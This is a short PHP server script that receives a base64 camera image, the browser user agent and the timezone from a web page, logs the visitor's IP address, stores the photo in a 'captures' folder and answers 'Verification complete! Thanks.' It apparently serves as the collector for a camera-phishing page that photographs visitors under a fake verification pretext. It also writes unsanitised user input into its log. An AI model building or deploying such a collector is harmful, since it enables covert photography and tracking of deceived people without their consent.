<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');

$data = json_decode(file_get_contents('php://input'), true);

if (!isset($data['image']) || !isset($data['userAgent']) || !isset($data['timezone'])) {
    http_response_code(400);
    echo "Missing data";
    exit;
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

$ip = getUserIP();
$userAgent = $data['userAgent'];
$timezone = $data['timezone'];

$imageData = $data['image'];
if (preg_match('/^data:image\/(\w+);base64,/', $imageData, $type)) {
    $imageData = substr($imageData, strpos($imageData, ',') + 1);
    $type = strtolower($type[1]); // png, jpg etc
    if (!in_array($type, ['png', 'jpg', 'jpeg'])) {
        http_response_code(400);
        echo 'Invalid image type.';
        exit;
    }
    $imageData = base64_decode($imageData);
    if ($imageData === false) {
        http_response_code(400);
        echo 'Base64 decode failed.';
        exit;
    }
} else {
    http_response_code(400);
    echo 'Invalid image data format.';
    exit;
}

$saveDir = __DIR__ . '/captures';
if (!file_exists($saveDir)) {
    mkdir($saveDir, 0755, true);
}
$filename = $saveDir . '/capture_' . date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.' . $type;
file_put_contents($filename, $imageData);

$logfile = __DIR__ . '/captures/log.txt';
$logEntry = date('Y-m-d H:i:s') . " | IP: $ip | UA: $userAgent | TZ: $timezone | Photo: " . basename($filename) . PHP_EOL;
file_put_contents($logfile, $logEntry, FILE_APPEND);

echo "Verification complete! Thanks.";
?>
